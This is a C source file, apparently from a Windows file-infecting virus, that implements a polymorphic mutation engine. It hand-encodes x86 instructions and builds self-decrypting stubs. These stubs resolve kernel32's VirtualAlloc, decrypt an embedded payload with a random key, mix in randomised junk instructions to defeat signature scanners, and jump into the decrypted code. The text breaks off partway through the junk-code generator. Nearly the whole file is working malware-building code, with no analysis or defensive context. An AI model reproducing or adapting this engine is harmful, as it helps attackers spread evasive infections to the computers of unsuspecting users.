#include <Windows.h>
#include "morf.h"
#include "common.h"
#include "infect.h"


bool add_block(BLOCK *b,uint8* data,int size){
	if (!b->size){
		b->data=(uint8*)m_malloc(size);
	}else{
		b->data=(uint8*)m_realloc(b->data,b->size+size);
	}
	memcpy(&b->data[b->size],data,size);
	b->size+=size;
	return true;
}

//------- PUSH -------
int _PUSH_R(BLOCK *b,uint8 reg){
	int i=1;
	uint8 op=0x50|reg;
	add_block(b,&op,1);
	return i;
}

int _POP_R(BLOCK *b,uint8 reg){
	int i=1;
	uint8 op=0x58|reg;
	add_block(b,&op,1);
	return i;
}

int _PUSH_C(BLOCK *b,uint32 c){
	int i=0;
	if (c>0x7f){
		OPCODE_5 op;
		op.o1=0x68;
		op.s=c;
		add_block(b,(uint8*)&op,sizeof(OPCODE_5));
		i=5;
	}else{
		OPCODE_2 op;
		op.o1=0x6A;
		op.o2=c;
		add_block(b,(uint8*)&op,sizeof(OPCODE_2));
		i=2;
	}
	return i;
}

int _PUSH_A(BLOCK *b,uint32 a){
	OPCODE_6 op;
	op.o1=0xFF;
	op.o2=0x35;
	op.s=a;
	add_block(b,(uint8*)&op,sizeof(OPCODE_6));
	return 6;
}

int _POP_A(BLOCK *b,uint32 a){
	OPCODE_6 op;
	op.o1=0x8F;
	op.o2=0x05;
	op.s=a;
	add_block(b,(uint8*)&op,sizeof(OPCODE_6));
	return 6;
}

int _PUSH_L(BLOCK *b,uint32 l){
	int i;
	if (l>0x7F){
		OPCODE_6 op;
		op.o1=0xFF;
		op.o2=0xB5;
		op.s=l;
		add_block(b,(uint8*)&op,sizeof(OPCODE_6));
		i=6;
	}else{
		OPCODE_3 op;
		op.o1=0xFF;
		op.o2=0x75;
		op.o3=l;
		add_block(b,(uint8*)&op,sizeof(OPCODE_3));
		i=3;
	}
	return i;
}

int _POP_L(BLOCK *b,uint32 l){
	int i;
	if (l>0x7F){
		OPCODE_6 op;
		op.o1=0x8F;
		op.o2=0x85;
		op.s=l;
		add_block(b,(uint8*)&op,sizeof(OPCODE_6));
		i=6;
	}else{
		OPCODE_3 op;
		op.o1=0x8F;
		op.o2=0x45;
		op.o3=l;
		add_block(b,(uint8*)&op,sizeof(OPCODE_3));
		i=3;
	}
	return i;
}

//------------- OP 2 ARG --------------

int _OP_RC(BLOCK *b,uint32 o,uint8 r,uint32 c){
	int i;
	switch(o){
		case _MOV:{
			OPCODE_5 op;
			op.o1=0xB8+r;
			op.s=c;
			add_block(b,(uint8*)&op,sizeof(OPCODE_5));
			i=5;
			break;
		}
		case _TEST:{
			if (r==_EAX){
				OPCODE_5 op;
				op.o1=0xA9;
				op.s=c;
				add_block(b,(uint8*)&op,sizeof(OPCODE_5));
				i=5;
			}else{
				OPCODE_6 op;
				op.o1=0xF7;
				op.o2=0xC1+(r-1);
				op.s=c;
				add_block(b,(uint8*)&op,sizeof(OPCODE_6));
				i=6;
			}
			break;
		}
		default:{
			if (r==_EAX){
				OPCODE_5 op;
				op.o1=0x05+r+o&0xFF;
				op.s=c;
				add_block(b,(uint8*)&op,sizeof(OPCODE_5));
				i=5;
			}else{
				OPCODE_6 op;
				op.o1=0x81;
				op.o2=0xC1+(r-1)+o&0xFF;
				op.s=c;
				add_block(b,(uint8*)&op,sizeof(OPCODE_6));
				i=6;
			}
			break;
		}
	}
	return i;
}

int _OP_RA(BLOCK *b,uint32 o,uint8 r,uint32 a){
	OPCODE_6 op;
	op.o1=0x03+o&0xFF;
	op.o2=0x05+r*8;
	op.s=a;
	add_block(b,(uint8*)&op,sizeof(OPCODE_6));
	return 6;
}

int _OP_AR(BLOCK *b,uint32 o,uint32 a,uint8 r){
	int i;
	switch(o){
		case _TEST:{
			OPCODE_6 op;
			op.o1=0x85;
			op.o2=0x05+r*8;
			op.s=a;
			add_block(b,(uint8*)&op,sizeof(OPCODE_6));
			i=6;
			break;
		}
		default:{
			OPCODE_6 op;
			op.o1=0x01+o&0xFF;
			op.o2=0x05+r*8;
			op.s=a;
			add_block(b,(uint8*)&op,sizeof(OPCODE_6));
			i=6;
		}
	}
	return i;
}

int _OP_LR(BLOCK *b,uint32 o,uint32 l,uint8 r){
	int i;
	if (o==_TEST){
		OPCODE_6 op;
		op.o1=0x85;
		op.o2=0x85+8*r;
		op.s=l;
		add_block(b,(uint8*)&op,sizeof(OPCODE_6));
		i=6;
	}else{
		OPCODE_6 op;
		op.o1=0x01+o&0xFF;
		op.o2=0x85+8*r;
		op.s=l;
		add_block(b,(uint8*)&op,sizeof(OPCODE_6));
		i=6;
	}
	return i;
}

int _OP_RL(BLOCK *b,uint32 o,uint8 r,uint32 l){
	OPCODE_6 op;
	op.o1=0x03+o&0xFF;
	op.o2=0x85+8*r;
	op.s=l;
	add_block(b,(uint8*)&op,sizeof(OPCODE_6));
	return 6;
}

int _OP_AC(BLOCK *b,uint32 o,uint32 a,uint32 c){
	int i;
	switch(o){
	case _MOV:{
		OPCODE_6 op;
		op.o1=0xC7;
		op.o2=0x05;
		op.s=a;
		add_block(b,(uint8*)&op,sizeof(OPCODE_6));
		add_block(b,(uint8*)&c,4);
		i=10;
		break;	
	}
	case _TEST:{
		OPCODE_6 op;
		op.o1=0xF7;
		op.o2=0x05;
		op.s=a;
		add_block(b,(uint8*)&op,sizeof(OPCODE_6));
		add_block(b,(uint8*)&c,4);
		i=10;
		break;	
	}

	default:{
		OPCODE_6 op;
		op.o1=0x81;
		op.o2=0x05+o&0xFF;
		op.s=a;
		add_block(b,(uint8*)&op,sizeof(OPCODE_6));
		add_block(b,(uint8*)&c,4);
		i=10;
		break;
	}
	}
	return i;
}

int _OP_LC(BLOCK *b,uint32 o,uint32 l,uint32 c){
	int i;
	switch(o){
	case _MOV:{
		OPCODE_6 op;
		op.o1=0xC7;
		op.o2=0x85;
		op.s=l;
		add_block(b,(uint8*)&op,sizeof(OPCODE_6));
		add_block(b,(uint8*)&c,4);
		i=10;
		break;
	}
	case _TEST:{
		OPCODE_6 op;
		op.o1=0xF7;
		op.o2=0x85;
		op.s=l;
		add_block(b,(uint8*)&op,sizeof(OPCODE_6));
		add_block(b,(uint8*)&c,4);
		i=10;
		break;
	}
	default:{
		OPCODE_6 op;
		op.o1=0x81;
		op.o2=0x85+o&0xFF;
		op.s=l;
		add_block(b,(uint8*)&op,sizeof(OPCODE_6));
		add_block(b,(uint8*)&c,4);
		i=10;
		break;
	}
	}
	return i;
}

int _OP_RR(BLOCK *b,uint32 o,uint8 r1,uint8 r2){
	OPCODE_2 op;
	op.o1=0x03+o&0xFF;
	op.o2=0xC0+r2+8*r1;
	add_block(b,(uint8*)&op,sizeof(OPCODE_2));
	return 2;
}

int _OP_ArR(BLOCK *b,uint32 o,uint8 r1,uint8 r2){
	int i;
	switch(o){
	case _TEST:{
		if (r1==_ESP){
			OPCODE_3 op;
			op.o1=0x85;
			op.o2=0x04+8*r2;
			op.o3=0x24;
			add_block(b,(uint8*)&op,sizeof(OPCODE_3));
			i=3;
		}else if (r1==_EBP){
			OPCODE_3 op;
			op.o1=0x85;
			op.o2=0x45+8*r2;
			op.o3=0x0;
			add_block(b,(uint8*)&op,sizeof(OPCODE_3));
			i=3;
		}else{
			OPCODE_2 op;
			op.o1=0x85;
			op.o2=0x00+r1+8*r2;
			add_block(b,(uint8*)&op,sizeof(OPCODE_2));
			i=2;
		}
		break;
	}
	default:{
		if (r1==_ESP){
			OPCODE_3 op;
			op.o1=0x01+o&0xFF;
			op.o2=0x04+8*r2;
			op.o3=0x24;
			add_block(b,(uint8*)&op,sizeof(OPCODE_3));
			i=3;
		}else if (r1==_EBP){
			OPCODE_3 op;
			op.o1=0x01+o&0xFF;
			op.o2=0x45+8*r2;
			op.o3=0x0;
			add_block(b,(uint8*)&op,sizeof(OPCODE_3));
			i=3;
		}else{
			OPCODE_2 op;
			op.o1=0x01+o&0xFF;
			op.o2=0x00+r1+8*r2;
			add_block(b,(uint8*)&op,sizeof(OPCODE_2));
			i=2;
		}
		break;
	}
	}
	return i;
}

int _OP_RAr(BLOCK *b,uint32 o,uint8 r1,uint8 r2){
	int i;
	if (r2==_ESP){
		OPCODE_3 op;
		op.o1=0x03+o&0xFF;
		op.o2=0x04+8*r1;
		op.o3=0x24;
		add_block(b,(uint8*)&op,sizeof(OPCODE_3));
		i=3;
	}else if (r2==_EBP){
		OPCODE_3 op;
		op.o1=0x03+o&0xFF;
		op.o2=0x45+8*r1;
		op.o3=0x0;
		add_block(b,(uint8*)&op,sizeof(OPCODE_3));
		i=3;
	}else{
		OPCODE_2 op;
		op.o1=0x03+o&0xFF;
		op.o2=0x00+8*r1+r2;
		add_block(b,(uint8*)&op,sizeof(OPCODE_2));
		i=2;
	}
	return i;
}

//------------------ CALL, JMP, JXX ------------------

int _CALL_C(BLOCK *b,uint32 a){
	OPCODE_5 op;
	op.o1=0xE8;
	op.s=a;
	add_block(b,(uint8*)&op,sizeof(OPCODE_5));
	return 5;
}

int _CALL_A(BLOCK *b,uint32 a){
	OPCODE_6 op;
	op.o1=0xFF;
	op.o2=0x15;
	op.s=a;
	add_block(b,(uint8*)&op,sizeof(OPCODE_6));
	return 6;
}

int _CALL_R(BLOCK *b,uint8 r){
	OPCODE_2 op;
	op.o1=0xFF;
	op.o2=0xD0+r;
	add_block(b,(uint8*)&op,sizeof(OPCODE_2));
	return 2;
}

int _CALL_Ar(BLOCK *b,uint8 r){
	if (r==4){//esp
		OPCODE_3 op;
		op.o1=0xFF;
		op.o2=0x14;
		op.o3=0x24;
		add_block(b,(uint8*)&op,sizeof(OPCODE_3));
		return 3;
	}
	
	if (r==5){//epb
		OPCODE_3 op;
		op.o1=0xFF;
		op.o2=0x55;
		op.o3=0x00;
		add_block(b,(uint8*)&op,sizeof(OPCODE_3));
		return 3;
	}

	OPCODE_2 op;
	op.o1=0xFF;
	op.o2=0x10+r;
	add_block(b,(uint8*)&op,sizeof(OPCODE_2));
	return 2;
}

int _JMP_C(BLOCK *b,uint32 a){
	OPCODE_5 op;
	op.o1=0xE9;
	op.s=a;
	add_block(b,(uint8*)&op,sizeof(OPCODE_5));
	return 5;
}

int _JMP_A(BLOCK *b,uint32 a){
	OPCODE_6 op;
	op.o1=0xFF;
	op.o2=0x25;
	op.s=a;
	add_block(b,(uint8*)&op,sizeof(OPCODE_6));
	return 6;
}

int _JMP_R(BLOCK *b,uint8 r){
	OPCODE_2 op;
	op.o1=0xFF;
	op.o2=0xE0+r;
	add_block(b,(uint8*)&op,sizeof(OPCODE_2));
	return 2;
}

int _JMP_Ar(BLOCK *b,uint8 r){
	OPCODE_2 op;
	op.o1=0xFF;
	op.o2=0x20+r;
	add_block(b,(uint8*)&op,sizeof(OPCODE_2));
	return 2;
}


int _JE_C(BLOCK *b,uint32 a){
	int i;
	if (a>255){
		OPCODE_6 op;
		op.o1=0x0F;
		op.o2=0x84;
		op.s=a;
		add_block(b,(uint8*)&op,sizeof(OPCODE_6));
		i=6;
	}else{
		OPCODE_2 op;
		op.o1=0x74;
		op.o2=(uint8)a&0xFF;
		add_block(b,(uint8*)&op,sizeof(OPCODE_2));
		i=2;
	}
	return i;
}

int _JNE_C(BLOCK *b,uint32 a){
	int i;
	if (a>255){
		OPCODE_6 op;
		op.o1=0x0F;
		op.o2=0x85;
		op.s=a;
		add_block(b,(uint8*)&op,sizeof(OPCODE_6));
		i=6;
	}else{
		OPCODE_2 op;
		op.o1=0x75;
		op.o2=(uint8)a&0xFF;
		add_block(b,(uint8*)&op,sizeof(OPCODE_2));
		i=2;
	}
	return i;
}


int _JB_C(BLOCK *b,uint32 a){
	int i;
//	if (a>255){
		OPCODE_6 op;
		op.o1=0x0F;
		op.o2=0x82;
		op.s=a;
		add_block(b,(uint8*)&op,sizeof(OPCODE_6));
		i=6;
/*
	}else{
		OPCODE_2 op;
		op.o1=0x72;
		op.o2=(uint8)a&0xFF;
		add_block(b,(uint8*)&op,sizeof(OPCODE_2));
		i=2;
	}
*/
	return i;
}

int _JA_C(BLOCK *b,uint32 a){
	int i;
	if (a>255){
		OPCODE_6 op;
		op.o1=0x0F;
		op.o2=0x87;
		op.s=a;
		add_block(b,(uint8*)&op,sizeof(OPCODE_6));
		i=6;
	}else{
		OPCODE_2 op;
		op.o1=0x77;
		op.o2=(uint8)a&0xFF;
		add_block(b,(uint8*)&op,sizeof(OPCODE_2));
		i=2;
	}
	return i;
}


int _JAE_C(BLOCK *b,uint32 a){
	int i;
	if (a>255){
		OPCODE_6 op;
		op.o1=0x0F;
		op.o2=0x83;
		op.s=a;
		add_block(b,(uint8*)&op,sizeof(OPCODE_6));
		i=6;
	}else{
		OPCODE_2 op;
		op.o1=0x73;
		op.o2=(uint8)a&0xFF;
		add_block(b,(uint8*)&op,sizeof(OPCODE_2));
		i=2;
	}
	return i;
}

int _JBE_C(BLOCK *b,uint32 a){
	int i;
//	if (a>255){
		i=6;
		OPCODE_6 op;
		op.o1=0x0F;
		op.o2=0x86;
		op.s=a;
		add_block(b,(uint8*)&op,sizeof(OPCODE_6));
/*
	}else{
		i=2;
		OPCODE_2 op;
		op.o1=0x76;
		op.o2=(uint8)a&0xFF;
		add_block(b,(uint8*)&op,sizeof(OPCODE_2));
	}
*/
	return i;
}

int _INC_R(BLOCK *b,uint8 r){
	uint8 op=0x40+r;
	add_block(b,(uint8*)&op,1);
	return 1;
}

int _DEC_R(BLOCK *b,uint8 r){
	uint8 op=0x48+r;
	add_block(b,(uint8*)&op,1);
	return 1;
}

int _INC_L(BLOCK *b,uint32 l){
	int i;
	if (l>0x7F){
		OPCODE_6 op;
		op.o1=0xFF;
		op.o2=0x85;
		op.s=l;
		add_block(b,(uint8*)&op,sizeof(OPCODE_6));
		i=6;
	}else{
		OPCODE_3 op;
		op.o1=0xFF;
		op.o2=0x45;
		op.o3=(uint8)l&0xFF;
		add_block(b,(uint8*)&op,sizeof(OPCODE_3));
		i=3;
	}
	return i;
}

int _DEC_L(BLOCK *b,uint32 l){
	int i;
	if (l>0x7F){
		OPCODE_6 op;
		op.o1=0xFF;
		op.o2=0x8D;
		op.s=l;
		add_block(b,(uint8*)&op,sizeof(OPCODE_6));
		i=6;
	}else{
		OPCODE_3 op;
		op.o1=0xFF;
		op.o2=0x4D;
		op.o3=(uint8)l&0xFF;
		add_block(b,(uint8*)&op,sizeof(OPCODE_3));
		i=3;
	}
	return i;
}

int _SHL_RC(BLOCK *b,uint8 r,uint8 c){
	OPCODE_3 op;
	op.o1=0xC1;
	op.o2=0xE0+r;
	op.o3=(uint8)c&0xFF;
	add_block(b,(uint8*)&op,sizeof(OPCODE_3));
	return 3;
}

int _SHR_RC(BLOCK *b,uint8 r,uint8 c){
	OPCODE_3 op;
	op.o1=0xC1;
	op.o2=0xE8+r;
	op.o3=(uint8)c&0xFF;
	add_block(b,(uint8*)&op,sizeof(OPCODE_3));
	return 3;
}

int _RET_C(BLOCK *b,uint16 c){
	int i;
	if (c==0){
		uint8 op=0xC3;
		add_block(b,(uint8*)&op,1);
		i=1;
	}else{
		OPCODE_3 op;
		op.o1=0xC2;
		op.o2=(uint8)c&0xFF;
		op.o3=(uint8)((c>>8)&0xFF);
		add_block(b,(uint8*)&op,sizeof(OPCODE_3));
		i=3;
	}
	return i;
}

int _LEA_RA(BLOCK *b,uint8 r,uint32 a){
	OPCODE_6 op;
	op.o1=0x8D;
	op.o2=0x05+8*r;
	op.s=a;
	add_block(b,(uint8*)&op,sizeof(OPCODE_6));
	return 6;
}

int _LEA_RRA(BLOCK *b,uint8 r1,uint8 r2,uint32 l){
	int i;
	if (r2==_ESP){
		OPCODE_3 op;
		op.o1=0x8D;
		op.o2=0x84+8*r1;
		op.o3=0x24;
		add_block(b,(uint8*)&op,sizeof(OPCODE_3));
		add_block(b,(uint8*)&l,4);
		i=7;
	}else{
		OPCODE_6 op;
		op.o1=0x8D;
		op.o2=0x80+8*r1+r2;
		op.s=l;
		add_block(b,(uint8*)&op,sizeof(OPCODE_6));
		i=6;
	}
	return i;
}

int _LOOP_A(BLOCK *b,uint8 a){
	OPCODE_2 op;
	op.o1=0xE2;
	op.o2=a;
	add_block(b,(uint8*)&op,sizeof(OPCODE_2));
	return 2;
}

int _LEAVE(BLOCK *b){
	uint8 op=0xC9;
	add_block(b,(uint8*)&op,1);
	return 1;
}

int _PUSHAD(BLOCK *b){
	uint8 op=0x60;
	add_block(b,(uint8*)&op,1);
	return 1;
}

int _POPAD(BLOCK *b){
	uint8 op=0x61;
	add_block(b,(uint8*)&op,1);
	return 1;
}

//===================================================================================================

int GEN_OP_LC(BLOCK *b,uint32 op,uint32 v,uint32 c){
	int l=0;
	int ind=rnd()%2;
	uint32 d=rnd();
	switch(ind){
	case 0: //mov , add
		l+=_OP_LC(b,op,v,c-d);
		l+=_OP_LC(b,_ADD,v,d);
		break;
	case 1://mov , sub
		l+=_OP_LC(b,op,v,c+d);
		l+=_OP_LC(b,_SUB,v,d);
		break;
	default:
		l+=_OP_LC(b,op,v,c);
		break;
	};
	return l;
}

int GEN_OP_RC(BLOCK *b,uint32 op,uint32 r,uint32 c){
	int l=0;
	int ind=rnd()%3;
	uint32 d=rnd();
	switch(ind){
	case 0: //mov , add
		l+=_OP_RC(b,op,r,c-d);
		l+=_OP_RC(b,_ADD,r,d);
		break;
	case 1://mov , sub
		l+=_OP_RC(b,op,r,c+d);
		l+=_OP_RC(b,_SUB,r,d);
		break;
	default://mov
		l+=_OP_RC(b,op,r,c);
		break;
	};
	return l;
}

int GEN_MOV_RR(BLOCK *b,uint32 r1,uint32 r2){
	int l=0;
	int k=rnd()%2;
	switch(k){
	case 0:
		l+=_OP_RR(b,_XOR,r1,r1);
		l+=_OP_RR(b,_ADD,r1,r2);
		break;
	default:
		l+=_OP_RR(b,_MOV,r1,r2);
		break;
	};
	return l;
}

int GEN_TRASH(BLOCK *b,uint32 max_loc){
	const uint32 reg_tab[6]={_EAX,_EBX,_ECX,_EDX,_ESI,_EDI};
	int l=0;
	if (max_loc<4) return l;
	uint32 t=rnd()%8;
	uint32 ind=(rnd()%(max_loc/4));
	uint32 ind_r=rnd()%6;
	switch(t){
	case 0:
		l+=_OP_LC(b,_MOV,-max_loc+ind*4,rnd());
		break;
	case 1:
		l+=_OP_LC(b,_ADD,-max_loc+ind*4,rnd());
		break;
	case 2:
		l+=_OP_LC(b,_SUB,-max_loc+ind*4,rnd());
		break;
	case 3:
		l+=_OP_LC(b,_XOR,-max_loc+ind*4,rnd());
		break;
	case 4:
		l+=_OP_LR(b,_XOR,-max_loc+ind*4,reg_tab[ind_r]);
		break;
	case 5:
		l+=_OP_LR(b,_ADD,-max_loc+ind*4,reg_tab[ind_r]);
		break;
	case 6:
		l+=_OP_LR(b,_SUB,-max_loc+ind*4,reg_tab[ind_r]);
		break;
	default:
		break;
	}

	return l;
}

int build_decrypt(BLOCK *b,uint32 base,uint32 start,uint32 d_rva,int len_d,int size,uint32 key,BLOCK *list,uint32 e,uint8 type){
	const uint32 reg_tab[16][4]={{_ESI,_EDI,_EDX,_EBX},
							   {_EDI,_EDX,_EBX,_ESI},
							   {_EDX,_EBX,_ESI,_EDI},
							   {_EBX,_ESI,_EDI,_EDX},

							   {_EDI,_ESI,_EDX,_EBX},
							   {_ESI,_EDX,_EBX,_EDI},
							   {_EDX,_EBX,_EDI,_ESI},
							   {_EBX,_EDI,_ESI,_EDX},

							   {_ESI,_EDX,_EDI,_EBX},
							   {_EDX,_EDI,_EBX,_ESI},
							   {_EDI,_EBX,_ESI,_EDX},
							   {_EBX,_ESI,_EDX,_EDI},

							   {_ESI,_EDI,_EBX,_EDX},
							   {_EDI,_EBX,_EDX,_ESI},
							   {_EBX,_EDX,_ESI,_EDI},
							   {_EDX,_ESI,_EDI,_EBX}};
//#define L_NAME -0x100
	uint32 L_NAME=(4*5+(rnd()%20)*4);
	int n=list->size/sizeof(ITEM_API);
	ITEM_API *api=(ITEM_API *)list->data;
	int l=0;
	l+=_PUSH_R(b,_EBP);
	l+=_OP_RR(b,_MOV,_EBP,_ESP);
	l+=_OP_RC(b,_SUB,_ESP,L_NAME);
	l+=_PUSHAD(b);
	//get delta
	l+=_CALL_C(b,0);
	uint32 delta=l;
	l+=_POP_L(b,-L_NAME+4*4);
	l+=GEN_OP_RC(b,_MOV,_EAX,base+delta+start);
	l+=_OP_LR(b,_SUB,-L_NAME+4*4,_EAX);
	//---------
	if (n>1){
		l+=GEN_OP_LC(b,_MOV,-L_NAME+4*0,'NREK');
		l+=GEN_OP_LC(b,_MOV,-L_NAME+4*1,'23LE');
		l+=GEN_OP_LC(b,_MOV,-L_NAME+4*2,'LLD.');
		l+=GEN_OP_LC(b,_MOV,-L_NAME+4*3,'\0');
		l+=_LEA_RRA(b,_EAX,_EBP,-L_NAME+4*0);
		l+=_PUSH_R(b,_EAX);
		//---
		l+=GEN_OP_RC(b,_MOV,_EAX,base+api[0].rva_addr);
		l+=_OP_RL(b,_ADD,_EAX,-L_NAME+4*4);
		//---
		l+=_CALL_Ar(b,_EAX);//delta reloc

		l+=GEN_OP_LC(b,_MOV,-L_NAME+4*0,'triV');
		l+=GEN_OP_LC(b,_MOV,-L_NAME+4*1,'Alau');
		l+=GEN_OP_LC(b,_MOV,-L_NAME+4*2,'coll');
		l+=GEN_OP_LC(b,_MOV,-L_NAME+4*3,'\0');
		l+=_LEA_RRA(b,_EBX,_EBP,-L_NAME+4*0);
		l+=_PUSH_R(b,_EBX);
		l+=_PUSH_R(b,_EAX);
		//---
		l+=GEN_OP_RC(b,_MOV,_EAX,base+api[1].rva_addr);
		l+=_OP_RL(b,_ADD,_EAX,-L_NAME+4*4);
		//---
		l+=_CALL_Ar(b,_EAX);
	}

	l+=_PUSH_C(b,PAGE_EXECUTE_READWRITE);
	l+=_PUSH_C(b,MEM_COMMIT);
	l+=_PUSH_C(b,len_d);
	l+=_PUSH_C(b,0);

	if (n>1){
		l+=_CALL_R(b,_EAX);
	}else{
		//---
		l+=GEN_OP_RC(b,_MOV,_EAX,base+api[0].rva_addr);
		l+=_OP_RL(b,_ADD,_EAX,-L_NAME+4*4);
		//---

		l+=_CALL_Ar(b,_EAX);
	}

	uint32 reg_ind=rnd()%16;
	//decryptor
	l+=GEN_OP_RC(b,_MOV,_ECX,size/4);
	l+=GEN_MOV_RR(b,reg_tab[reg_ind][1],_EAX);
	l+=GEN_OP_RC(b,_MOV,reg_tab[reg_ind][2],base+d_rva);
	//--
	l+=_OP_RL(b,_ADD,reg_tab[reg_ind][2],-L_NAME+4*4);
	//--
	l+=GEN_OP_RC(b,_MOV,reg_tab[reg_ind][0],key);
	int l1=0;
	l1+=GEN_TRASH(b,L_NAME-4*5);
	l1+=_OP_RAr(b,_MOV,reg_tab[reg_ind][3],reg_tab[reg_ind][2]);
	l1+=GEN_TRASH(b,L_NAME-4*5);
	switch(type){
	case _CIP_XOR:
		l1+=_OP_RR(b,_XOR,reg_tab[reg_ind][3],reg_tab[reg_ind][0]);
		break;
	case _CIP_SUB:
		l1+=_OP_RR(b,_ADD,reg_tab[reg_ind][3],reg_tab[reg_ind][0]);
		break;
	case _CIP_ADD:
		l1+=_OP_RR(b,_SUB,reg_tab[reg_ind][3],reg_tab[reg_ind][0]);
		break;
	}
	l1+=GEN_TRASH(b,L_NAME-4*5);
	l1+=_OP_ArR(b,_MOV,reg_tab[reg_ind][1],reg_tab[reg_ind][3]);
	l1+=GEN_TRASH(b,L_NAME-4*5);
	l1+=GEN_OP_RC(b,_ADD,reg_tab[reg_ind][1],4);
	l1+=GEN_OP_RC(b,_ADD,reg_tab[reg_ind][2],4);
	l+=l1;
	l+=_LOOP_A(b,-(l1+2));
	//===========

	l+=GEN_OP_RC(b,_ADD,_EAX,e);
	l+=GEN_MOV_RR(b,_EBX,_EAX);
	l+=GEN_OP_RC(b,_ADD,_EAX,5);

	l+=GEN_OP_RC(b,_MOV,_ECX,base);
	l+=_OP_RL(b,_ADD,_ECX,-L_NAME+4*4);
	l+=_CALL_R(b,_EBX);
	l+=_LEAVE(b);
	l+=_RET_C(b,0);
	return l;
}

/*
int build_decrypt1(BLOCK *b,uint32 base,uint32 d_rva,int len_d,int size,uint32 key,BLOCK *list,uint32 e){
#define L_NAME -0x100
	int n=list->size/sizeof(ITEM_API);
	ITEM_API *api=(ITEM_API *)list->data;
	int l=0;
	l+=_PUSH_R(b,_EBP);
	l+=_OP_RR(b,_MOV,_EBP,_ESP);
	l+=_OP_RC(b,_SUB,_ESP,0x100);
	l+=_PUSHAD(b);
	if (n>1){
		l+=_OP_LC(b,_MOV,L_NAME+4*0,'NREK');
		l+=_OP_LC(b,_MOV,L_NAME+4*1,'23LE');
		l+=_OP_LC(b,_MOV,L_NAME+4*2,'LLD.');
		l+=_OP_LC(b,_MOV,L_NAME+4*3,'\0');
		l+=_LEA_RRA(b,_EAX,_EBP,L_NAME);
		l+=_PUSH_R(b,_EAX);
		l+=_CALL_A(b,base+api[0].rva_addr);

		l+=_OP_LC(b,_MOV,L_NAME+4*0,'triV');
		l+=_OP_LC(b,_MOV,L_NAME+4*1,'Alau');
		l+=_OP_LC(b,_MOV,L_NAME+4*2,'coll');
		l+=_OP_LC(b,_MOV,L_NAME+4*3,'\0');
		l+=_LEA_RRA(b,_EBX,_EBP,L_NAME);
		l+=_PUSH_R(b,_EBX);
		l+=_PUSH_R(b,_EAX);
		l+=_CALL_A(b,base+api[1].rva_addr);
	}

	l+=_PUSH_C(b,PAGE_EXECUTE_READWRITE);
	l+=_PUSH_C(b,MEM_COMMIT);
	l+=_PUSH_C(b,len_d);
	l+=_PUSH_C(b,0);

	if (n>1){
		l+=_CALL_R(b,_EAX);
	}else{
		l+=_CALL_A(b,base+api[0].rva_addr);
	}
	l+=_OP_RC(b,_MOV,_ECX,size/4);
	l+=_OP_RR(b,_MOV,_EDI,_EAX);
	l+=_OP_RC(b,_MOV,_ESI,base+d_rva);
	l+=_OP_RC(b,_MOV,_EBX,key);
	int l1=0;
	l1+=_OP_RAr(b,_MOV,_EDX,_ESI);
	l1+=_OP_RC(b,_XOR,_EDX,key);
	l1+=_OP_ArR(b,_MOV,_EDI,_EDX);
	l1+=_OP_RC(b,_ADD,_EDI,4);
	l1+=_OP_RC(b,_ADD,_ESI,4);
	l+=l1;
	l+=_LOOP_A(b,-(l1+2));
	l+=_OP_RC(b,_ADD,_EAX,e);//�������� �������
	l+=_OP_RR(b,_MOV,_ECX,_EAX);
	l+=_OP_RC(b,_ADD,_EAX,5);//����������� ������ 
	l+=_CALL_R(b,_ECX);
	l+=_LEAVE(b);
	l+=_RET_C(b,0);
	return l;
}
*/

void init_reg_var(TRASH *t){
	int n=sizeof(_REG)/4;
	for (int i=0;i<n;i++){
		if (t->reg[i].st){
			t->reg[i].var=get_var(t);
		}
	}
}

int gen_call(BLOCK *b,GEN_CALL *gc,BLOCK *in){
	int l=0;
	gc->offset=b->size;
	int n_loc=(rnd()%20)*4+gc->loc*4+4;
	l+=_PUSH_R(b,_EBP);
	l+=_OP_RR(b,_MOV,_EBP,_ESP);
	l+=_OP_RC(b,_SUB,_ESP,n_loc);
	l+=in->size;
	add_block(b,in->data,in->size);
	l+=_LEAVE(b);
	l+=_RET_C(b,gc->narg*4);
	gc->len=l;
	return l;
}

int get_var(TRASH *t){
	int j=rnd()%t->l_size;
	int g=j;
	int r=-1;
	bool bexit;
	do{
		bexit=false;
		r=j;
		for (int i=0;i<sizeof(_REG);i++){
			if (t->reg[i].var==j) {
				bexit=true;
			}
		}
		j++;
		if (j>t->l_size) j=0;
	}while(g==j || bexit);
	if (g==j) r=-1;
	return r;
}

void restore_reg(BLOCK *b,TRASH *t,int i){
	if (t->reg[i].l_st && t->reg[i].st){
		t->lc+=_OP_RL(b,_OP_TYPE[0],i,-t->reg[i].var*4);
		t->reg[i].l_st=false;
	}
}
void restore_regs(BLOCK *b,TRASH *t){
	for (int i=0;i<sizeof(_REG)/4;i++){
		if (t->reg[i].st && t->reg[i].l_st){
			restore_reg(b,t,i);
		}
	}
}

void gen_block(BLOCK *b,TRASH *t,int n){
	t->type=0;
	for (int i=0;i<n;i++){
		gen_trash(b,t);
		t->type^=1;
	}
}

void gen_trash(BLOCK *b,TRASH *t){

	uint32 op=rnd()%(sizeof(_OP_TYPE)/4);
	uint32 op1=_OP1[rnd()%(sizeof(_OP1)/4)];
	uint32 op2=_OP2[rnd()%(sizeof(_OP2)/4)];
	uint32 op3=_OP3[rnd()%(sizeof(_OP3)/4)];
	uint32 reg1=_REG[rnd()%(sizeof(_REG)/4)];
	uint32 reg2=_REG[rnd()%(sizeof(_REG)/4)];
	uint32 c1=t->data+rnd()%t->d_size;
	uint32 c2=t->data+rnd()%t->d_size;
	uint32 k=rnd()%t->l_size;
	
	switch(t->type){
		case 0:{
			switch(op1){
				case T_OP_RR:{
					if (t->reg[reg1].st && !t->reg[reg1].l_st){
						t->lc+=_OP_LR(b,_OP_TYPE[0],-t->reg[reg1].var*4,reg1);
						t->lc+=_OP_RR(b,_OP_TYPE[op],reg1,reg2);	
						t->reg[reg1].l_st=true;
					}else{
						t->lc+=_OP_RR(b,_OP_TYPE[op],reg1,reg2);
					}
				}break;
				case T_OP_LR:{
					k=get_var(t);
					if (k==-1) break;
					t->lc+=_OP_LR(b,_OP_TYPE[op],-k*4,reg2);
				}break;
				case T_OP_RL:{
					if (t->reg[reg1].st && !t->reg[reg1].l_st){
						t->lc+=_OP_LR(b,_OP_TYPE[0],-t->reg[reg1].var*4,reg1);
						t->lc+=_OP_RL(b,_OP_TYPE[op],reg1,-k*4);
						t->reg[reg1].l_st=true;
					}else{
						t->lc+=_OP_RL(b,_OP_TYPE[op],reg1,-k*4);
					}
				}break;
				case T_OP_RC:{
					if (t->reg[reg1].st && !t->reg[reg1].l_st){
